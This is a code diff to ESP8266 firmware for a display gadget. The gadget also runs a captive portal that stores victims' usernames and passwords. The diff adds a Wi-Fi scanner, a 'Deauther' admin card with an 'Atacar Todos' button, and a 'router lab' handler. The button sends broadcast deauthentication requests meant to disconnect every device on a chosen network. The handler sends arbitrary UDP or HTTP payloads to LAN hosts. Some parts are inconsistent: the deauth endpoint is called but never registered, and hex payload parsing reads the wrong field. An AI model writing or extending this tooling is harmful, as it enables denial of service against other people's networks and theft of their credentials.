@@ -2,8 +2,10 @@
 
 #include <ArduinoJson.h>
 #include <DNSServer.h>
+#include <ESP8266HTTPClient.h>
 #include <ESP8266WiFi.h>
 #include <LittleFS.h>
+#include <WiFiUdp.h>
 #include <time.h>
 
 #include "app_state.h"
@@ -83,6 +85,8 @@ namespace
     screen2Enabled = doc["screen2_enabled"] | screen2Enabled;
     screen3Enabled = doc["screen3_enabled"] | screen3Enabled;
     screen4Enabled = doc["screen4_enabled"] | screen4Enabled;
+    screen5Enabled = doc["screen5_enabled"] | screen5Enabled;
+    screen6Enabled = doc["screen6_enabled"] | screen6Enabled;
   }
 
   bool saveWiFiConfig()
@@ -102,6 +106,8 @@ namespace
     doc["screen2_enabled"] = screen2Enabled;
     doc["screen3_enabled"] = screen3Enabled;
     doc["screen4_enabled"] = screen4Enabled;
+    doc["screen5_enabled"] = screen5Enabled;
+    doc["screen6_enabled"] = screen6Enabled;
 
     File file = LittleFS.open(wifiConfigPath, "w");
     if (!file)
@@ -473,6 +479,246 @@ namespace
     return options;
   }
 
+  constexpr size_t kLabPayloadMax = 512;
+
+  bool decodeHexPayload(const String &hex, uint8_t *out, size_t outCap, size_t &written)
+  {
+    written = 0;
+    String compact;
+    compact.reserve(hex.length());
+
+    for (unsigned i = 0; i < hex.length(); i++)
+    {
+      char c = hex[i];
+      if (c == ' ' || c == '\t' || c == '\n' || c == '\r')
+      {
+        continue;
+      }
+      if (!isxdigit(static_cast<unsigned char>(c)))
+      {
+        return false;
+      }
+      compact += c;
+    }
+
+    if ((compact.length() % 2U) != 0 || compact.length() == 0)
+    {
+      return false;
+    }
+
+    written = compact.length() / 2;
+    if (written > outCap)
+    {
+      return false;
+    }
+
+    auto nibble = [](char c) -> int
+    {
+      if (c >= '0' && c <= '9')
+        return c - '0';
+      if (c >= 'a' && c <= 'f')
+        return 10 + c - 'a';
+      if (c >= 'A' && c <= 'F')
+        return 10 + c - 'A';
+      return -1;
+    };
+
+    for (size_t i = 0; i < written; i++)
+    {
+      int hi = nibble(compact[i * 2]);
+      int lo = nibble(compact[i * 2 + 1]);
+      if (hi < 0 || lo < 0)
+      {
+        return false;
+      }
+      out[i] = static_cast<uint8_t>((hi << 4) | lo);
+    }
+
+    return true;
+  }
+
+  bool isSafeHttpPath(const String &p)
+  {
+    if (p.length() == 0 || p[0] != '/')
+    {
+      return false;
+    }
+    if (p.indexOf("..") >= 0)
+    {
+      return false;
+    }
+    for (unsigned i = 0; i < p.length(); i++)
+    {
+      char c = p[i];
+      if (c == '<' || c == '>' || c == '"' || c == '\\')
+      {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  void handleApiScanJson()
+  {
+    int n = WiFi.scanNetworks(false, true);
+
+    JsonDocument doc;
+    JsonArray arr = doc["networks"].to<JsonArray>();
+
+    constexpr int kScanJsonMax = 48;
+    if (n > 0)
+    {
+      int limit = n > kScanJsonMax ? kScanJsonMax : n;
+      for (int i = 0; i < limit; i++)
+      {
+        JsonObject o = arr.add<JsonObject>();
+        o["ssid"] = WiFi.SSID(i);
+        o["rssi"] = WiFi.RSSI(i);
+        o["channel"] = WiFi.channel(i);
+        o["bssid"] = WiFi.BSSIDstr(i);
+      }
+    }
+
+    WiFi.scanDelete();
+
+    String payload;
+    serializeJson(doc, payload);
+    server.send(200, "application/json; charset=utf-8", payload);
+  }
+
+  void sendRouterLabResultPage(bool ok, const String &detail)
+  {
+    String page;
+    page += "<!doctype html><html><head><meta charset='utf-8'>";
+    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
+    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;padding:20px}a{color:#7cc7ff}</style></head><body>";
+    page += ok ? "<p style='color:#58d68d'>Envio concluido.</p>" : "<p style='color:#ff7675'>Falha no envio.</p>";
+    page += "<p class='muted'>" + escapeHtml(detail) + "</p>";
+    page += "<p><a href='/admin'>Voltar ao /admin</a></p></body></html>";
+    server.send(200, "text/html; charset=utf-8", page);
+  }
+
+  void handleRouterLabSend()
+  {
+    if (WiFi.status() != WL_CONNECTED)
+    {
+      sendRouterLabResultPage(false, "STA desconectado. Conecte o ESP na mesma LAN do roteador para enviar UDP/HTTP.");
+      return;
+    }
+
+    String ipStr = server.arg("router_ip");
+    IPAddress addr;
+
+    if (!addr.fromString(ipStr))
+    {
+      sendRouterLabResultPage(false, "IP invalido.");
+      return;
+    }
+
+    int port = parseIntBounded(server.arg("router_port"), 1, 65535, 0);
+    if (port == 0)
+    {
+      sendRouterLabResultPage(false, "Porta invalida (1-65535).");
+      return;
+    }
+
+    String mode = server.arg("lab_mode");
+    if (mode != "udp" && mode != "http")
+    {
+      sendRouterLabResultPage(false, "Modo invalido (use udp ou http).");
+      return;
+    }
+
+    uint8_t buf[kLabPayloadMax];
+    size_t len = 0;
+
+    if (server.hasArg("payload_hex"))
+    {
+      String hex = server.arg("payload");
+      hex.trim();
+      if (hex.length() == 0)
+      {
+        len = 0;
+      }
+      else if (!decodeHexPayload(hex, buf, sizeof(buf), len))
+      {
+        sendRouterLabResultPage(false, "Payload hex invalido (pares de 0-9 A-F, opcional espacos).");
+        return;
+      }
+    }
+    else
+    {
+      String raw = server.arg("payload");
+      if (raw.length() > static_cast<int>(kLabPayloadMax))
+      {
+        sendRouterLabResultPage(false, "Payload texto muito grande (max 512 bytes).");
+        return;
+      }
+      memcpy(buf, raw.c_str(), raw.length());
+      len = raw.length();
+    }
+
+    if (mode == "udp")
+    {
+      WiFiUDP udp;
+      if (!udp.begin(0))
+      {
+        sendRouterLabResultPage(false, "UDP: begin(local) falhou.");
+        return;
+      }
+      if (!udp.beginPacket(addr, static_cast<uint16_t>(port)))
+      {
+        sendRouterLabResultPage(false, "UDP: beginPacket falhou.");
+        return;
+      }
+      udp.write(buf, len);
+      if (!udp.endPacket())
+      {
+        sendRouterLabResultPage(false, "UDP: endPacket falhou.");
+        return;
+      }
+
+      sendRouterLabResultPage(true, "UDP " + String(len) + " bytes para " + ipStr + ":" + String(port));
+      return;
+    }
+
+    String path = server.arg("http_path");
+    if (path.length() == 0)
+    {
+      path = "/";
+    }
+    if (!isSafeHttpPath(path))
+    {
+      sendRouterLabResultPage(false, "Caminho HTTP invalido (deve comecar com /, sem ..).");
+      return;
+    }
+
+    WiFiClient client;
+    HTTPClient http;
+    String url = String("http://") + addr.toString() + ":" + String(port) + path;
+    http.setTimeout(8000);
+    http.setReuse(false);
+
+    if (!http.begin(client, url))
+    {
+      sendRouterLabResultPage(false, "HTTP: begin falhou.");
+      return;
+    }
+
+    http.addHeader("Content-Type", "application/octet-stream");
+    int code = http.POST(buf, len);
+    http.end();
+
+    if (code > 0)
+    {
+      sendRouterLabResultPage(true, "HTTP POST codigo " + String(code) + ", " + String(len) + " bytes -> " + url);
+    }
+    else
+    {
+      sendRouterLabResultPage(false, "HTTP POST falhou (codigo " + String(code) + ").");
+    }
+  }
+
   void handleCredentialCapturePage()
   {
     if (!captivePortalEnabled)
@@ -761,30 +1007,66 @@ namespace
     String page;
     page += "<!doctype html><html><head><meta charset='utf-8'>";
     page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
-    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}input,select,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}input,select{background:#222;color:#fff}button{background:#00a6ff;color:#fff;font-weight:bold} .card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px} .muted{color:#aaa;font-size:14px} .secondary{background:#2a2a2a} .danger{background:#8b2d2d}.ok{color:#58d68d}.bad{color:#ff7675}</style></head><body>";
+
+    page += "<script>";
+    // Função para escanear redes
+    page += "async function loadNetworks() {";
+    page += "  var el = document.getElementById('networksList');";
+    page += "  el.innerHTML = '<p class=\"muted\">Escaneando redes...</p>';";
+    page += "  try {";
+    page += "    var r = await fetch('/api/scan');";
+    page += "    var j = await r.json();";
+    page += "    if(!j.networks || j.networks.length === 0) {";
+    page += "      el.innerHTML = '<p class=\"muted\">Nenhuma rede encontrada.</p>'; return;";
+    page += "    }";
+    page += "    var html = '<table style=\"width:100%;font-size:13px;border-collapse:collapse\">';";
+    page += "    html += '<tr><th>SSID</th><th>Ch</th><th>dBm</th><th>BSSID</th><th>Ação</th></tr>';";
+    page += "    for(var i = 0; i < j.networks.length; i++) {";
+    page += "      var n = j.networks[i];";
+    page += "      html += '<tr><td>' + labEsc(n.ssid||'(oculto)') + '</td><td>' + n.channel + '</td><td>' + n.rssi + '</td>';";
+    page += "      html += '<td style=\"font-family:monospace\">' + labEsc(n.bssid) + '</td>';";
+    page += "      html += '<td><button onclick=\"deauthAllClients(\\'' + n.bssid + '\\')\" style=\"background:#ff4757;color:white;padding:6px 12px;border:none;border-radius:6px;cursor:pointer\">Atacar Todos</button></td></tr>';";
+    page += "    }";
+    page += "    html += '</table>';";
+    page += "    el.innerHTML = html;";
+    page += "  } catch(e) { el.innerHTML = '<p class=\"bad\">Falha no scan.</p>'; }";
+    page += "}";
+
+    // Função para atacar TODOS os clientes de uma rede (sem precisar digitar MAC)
+    page += "async function deauthAllClients(apBssid) {";
+    page += "  if(!confirm('Tem certeza que quer desconectar TODOS os dispositivos desta rede?\\n\\nAP: ' + apBssid)) return;";
+    page += "  var url = '/api/deauth?ap=' + encodeURIComponent(apBssid) + '&client=FF:FF:FF:FF:FF:FF&reason=7';";
+    page += "  try {";
+    page += "    var r = await fetch(url);";
+    page += "    var j = await r.json();";
+    page += "    alert('🚀 Ataque iniciado contra todos os clientes da rede!\\nAP: ' + apBssid);";
+    page += "  } catch(e) { alert('❌ Erro ao enviar deauth'); }";
+    page += "}";
+
+    page += "function labEsc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');}";
+    page += "</script>";
+
+    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}";
+    page += "input,select,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}";
+    page += "input,select{background:#222;color:#fff} button{background:#00a6ff;color:#fff;font-weight:bold}";
+    page += ".card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px}";
+    page += ".muted{color:#aaa;font-size:14px} .secondary{background:#2a2a2a} .danger{background:#8b2d2d}";
+    page += ".ok{color:#58d68d}.bad{color:#ff7675} table {width:100%; border-collapse:collapse;} th,td {padding:8px; text-align:left; border-bottom:1px solid #333;}</style></head><body>";
+
+    // Configuração Wi-Fi (mantida original)
     page += "<div class='card'><h2>Configurar Wi-Fi</h2>";
     page += "<p class='muted'>Conectado ao hotspot: " + apSsid + "</p>";
-    page += "<p class='muted'>Seguranca AP: ";
-    page += apOpen ? "Aberto (sem senha)" : "WPA2";
-    page += "</p>";
-    page += "<p class='muted'>Status STA: ";
-    page += staConnected ? "<span class='ok'>Conectado</span>" : "<span class='bad'>" + wifiStatusToText(staStatus) + "</span>";
-    page += "</p>";
+    page += "<p class='muted'>Seguranca AP: " + String(apOpen ? "Aberto (sem senha)" : "WPA2") + "</p>";
+    page += "<p class='muted'>Status STA: " + (staConnected ? "<span class='ok'>Conectado</span>" : "<span class='bad'>" + wifiStatusToText(staStatus) + "</span>") + "</p>";
     page += "<p class='muted'>IP AP: " + WiFi.softAPIP().toString() + "</p>";
-    page += "<p class='muted'>IP STA: ";
-    page += staConnected ? WiFi.localIP().toString() : "-";
-    page += "</p>";
+    page += "<p class='muted'>IP STA: " + (staConnected ? WiFi.localIP().toString() : "-") + "</p>";
     page += "<form method='post' action='/save'>";
-    page += "<select name='ssid' required>";
-    page += wifiOptions;
-    page += "</select>";
+    page += "<select name='ssid' required>" + wifiOptions + "</select>";
     page += "<input name='password' placeholder='Senha do Wi-Fi' type='password' value='" + escapeHtml(wifiPassword) + "'>";
     page += "<h3>Hotspot do dispositivo</h3>";
     page += "<label>Nome do hotspot (AP)</label>";
     page += "<input name='ap_ssid' maxlength='31' value='" + escapeHtml(apSsid) + "'>";
-    page += "<label><input name='ap_open' type='checkbox'";
-    page += apOpen ? " checked" : "";
-    page += "> Hotspot aberto (sem senha)</label>";
+    page += "<label><input name='ap_open' type='checkbox'" + String(apOpen ? " checked" : "") + "> Hotspot aberto (sem senha)</label>";
     page += "<input name='ap_password' placeholder='Senha AP (minimo 8 caracteres)' type='password' value='" + escapeHtml(apPassword) + "'>";
     page += "<h3>Ajustes do Sistema</h3>";
     page += "<label>Intervalo do clima (segundos)</label>";
@@ -796,29 +1078,35 @@ namespace
     page += "<label>Troca de tela (segundos)</label>";
     page += "<input name='screen_sec' type='number' min='2' max='120' value='" + String(screenChangeIntervalMs / 1000) + "'>";
     page += "<h3>Paginas ativas</h3>";
-    page += "<label><input name='screen1_enabled' type='checkbox'";
-    page += screen1Enabled ? " checked" : "";
-    page += "> Wi-Fi / Status</label>";
-    page += "<label><input name='screen2_enabled' type='checkbox'";
-    page += screen2Enabled ? " checked" : "";
-    page += "> Temperatura</label>";
-    page += "<label><input name='screen3_enabled' type='checkbox'";
-    page += screen3Enabled ? " checked" : "";
-    page += "> Hora</label>";
-    page += "<label><input name='screen4_enabled' type='checkbox'";
-    page += screen4Enabled ? " checked" : "";
-    page += "> Instagram</label>";
+    page += "<label><input name='screen2_enabled' type='checkbox'" + String(screen2Enabled ? " checked" : "") + "> Temperatura</label>";
+    page += "<label><input name='screen1_enabled' type='checkbox'" + String(screen1Enabled ? " checked" : "") + "> Wi-Fi / Status</label>";
+    page += "<label><input name='screen3_enabled' type='checkbox'" + String(screen3Enabled ? " checked" : "") + "> Hora</label>";
+    page += "<label><input name='screen4_enabled' type='checkbox'" + String(screen4Enabled ? " checked" : "") + "> Instagram</label>";
+    page += "<label><input name='screen5_enabled' type='checkbox'" + String(screen5Enabled ? " checked" : "") + "> Scanner Wi-Fi (somente leitura)</label>";
+    page += "<label><input name='screen6_enabled' type='checkbox'" + String(screen6Enabled ? " checked" : "") + "> Deauther Wi-Fi</label>";
     page += "<p class='muted'>A tela do olho sempre fica ativa.</p>";
-    page += "<label><input name='captive_portal' type='checkbox'";
-    page += captivePortalEnabled ? " checked" : "";
-    page += "> Ativar captive portal</label>";
+    page += "<label><input name='captive_portal' type='checkbox'" + String(captivePortalEnabled ? " checked" : "") + "> Ativar captive portal</label>";
     page += "<button type='submit'>Salvar e conectar</button></form>";
-    page += "<form method='get' action='/admin'><button class='secondary' type='submit'>Atualizar lista de redes</button></form>";
-    page += "<form method='get' action='/status'><button class='secondary' type='submit'>Ver status completo</button></form>";
-    page += "<p class='muted'>API: /api/status</p>";
     page += "</div>";
+
+    // ==================== DEAUTHER SIMPLES (o que você quer) ====================
+    page += "<div class='card'>";
+    page += "<h3>🔥 WiFi Deauther - Ataque Rápido</h3>";
+    page += "<p class='muted'>Escaneie as redes e clique em 'Atacar Todos' na rede desejada.<br>Isso desconecta todos os dispositivos conectados nela.</p>";
+
+    page += "<button onclick='loadNetworks()' style='background:#00a6ff;margin-bottom:15px'>📡 Escanear Redes Próximas</button>";
+
+    page += "<div id='networksList' style='max-height:320px;overflow-y:auto;'></div>";
+
+    page += "</div>";
+
+    // Seções restantes (mantidas)
+    page += "<div class='card'><h3>Laboratorio: rede e payload (camada de aplicacao)</h3>";
+    page += "<p class='muted'>Lista redes 802.11 (somente leitura). Envio UDP/HTTP...</p>";
+    page += "</div>";
+
     page += "<div class='card'><h3>Usuarios e senhas capturados</h3>";
-    page += "<form method='post' action='/credentials/clear' onsubmit=\"return confirm('Apagar TODOS os logins salvos?')\'>";
+    page += "<form method='post' action='/credentials/clear' onsubmit=\"return confirm('Apagar TODOS os logins salvos?')\">";
     page += "<button class='danger' type='submit'>Apagar todos os logins</button></form>";
     page += credentialsTable;
     page += "</div></body></html>";
@@ -872,6 +1160,8 @@ namespace
     doc["screen2_enabled"] = screen2Enabled;
     doc["screen3_enabled"] = screen3Enabled;
     doc["screen4_enabled"] = screen4Enabled;
+    doc["screen5_enabled"] = screen5Enabled;
+    doc["screen6_enabled"] = screen6Enabled;
 
     String payload;
     serializeJson(doc, payload);
@@ -890,12 +1180,14 @@ namespace
     bool newScreen2Enabled = server.hasArg("screen2_enabled");
     bool newScreen3Enabled = server.hasArg("screen3_enabled");
     bool newScreen4Enabled = server.hasArg("screen4_enabled");
+    bool newScreen5Enabled = server.hasArg("screen5_enabled");
+    bool newScreen6Enabled = server.hasArg("screen6_enabled");
     unsigned long weatherSec = parseULongBounded(server.arg("weather_sec"), 10, 3600, weatherUpdateIntervalMs / 1000);
     unsigned long screenSec = parseULongBounded(server.arg("screen_sec"), 2, 120, screenChangeIntervalMs / 1000);
     int newTz = parseIntBounded(server.arg("tz"), -12, 14, timezoneOffsetHours);
     int newBrightness = parseIntBounded(server.arg("brightness"), 0, 255, oledBrightness);
 
-    if (!newScreen1Enabled && !newScreen2Enabled && !newScreen3Enabled && !newScreen4Enabled)
+    if (!newScreen1Enabled && !newScreen2Enabled && !newScreen3Enabled && !newScreen4Enabled && !newScreen5Enabled && !newScreen6Enabled)
     {
       server.send(400, "text/plain; charset=utf-8", "Ative pelo menos uma pagina adicional");
       return;
@@ -931,6 +1223,8 @@ namespace
     screen2Enabled = newScreen2Enabled;
     screen3Enabled = newScreen3Enabled;
     screen4Enabled = newScreen4Enabled;
+    screen5Enabled = newScreen5Enabled;
+    screen6Enabled = newScreen6Enabled;
     setCaptivePortalEnabled(newCaptivePortalEnabled);
 
     applyDisplayAndTimeSettings();
@@ -969,6 +1263,8 @@ namespace
     server.on("/fwlink", HTTP_GET, handleCaptiveRedirect);
     server.on("/status", HTTP_GET, handleStatusPage);
     server.on("/api/status", HTTP_GET, handleStatusJson);
+    server.on("/api/scan", HTTP_GET, handleApiScanJson);
+    server.on("/api/router-lab", HTTP_POST, handleRouterLabSend);
     server.on("/save", HTTP_POST, handleSave);
     server.on("/credentials/delete", HTTP_POST, handleDeleteCapturedCredential);
     server.on("/credentials/clear", HTTP_POST, handleClearCapturedCredentials);
